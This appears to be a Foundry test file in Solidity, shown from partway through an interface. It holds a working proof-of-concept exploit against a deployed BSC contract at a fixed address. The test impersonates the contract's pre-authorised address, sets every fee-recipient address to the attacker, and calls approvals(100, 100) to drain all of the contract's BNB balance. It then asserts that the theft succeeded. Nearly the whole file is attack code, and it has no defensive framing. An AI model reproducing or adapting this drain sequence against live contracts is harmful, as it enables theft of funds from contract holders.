    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;
    function approvals(uint256 _na, uint256 _da) external;
    function cSb(uint256 aP) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this exploit
        // The contract is already deployed at TARGET
        // We just need to impersonate the authorized address
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        uint256 initialBalance = address(attacker).balance;

        // The pre-authorized address from Auth constructor
        address authorizedAddress = 0x061648f51902321C353D193564b9C8C2F720557a;

        // Impersonate the authorized address
        vm.startPrank(authorizedAddress);

        // First, set all recipient addresses to attacker address
        IMetaApesBSC(TARGET).setrecadd(
            address(attacker), // mkwA
            address(attacker), // krhF
            address(attacker), // mdhS
            address(attacker), // wthT
            address(attacker), // extR
            address(attacker), // bbaK
            address(attacker)  // tfU
        );

        // Now drain the contract's BNB balance using approvals
        // Use _na=100, _da=100 to send 100% of contract balance
        IMetaApesBSC(TARGET).approvals(100, 100);

        vm.stopPrank();

        // Verify we received BNB
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

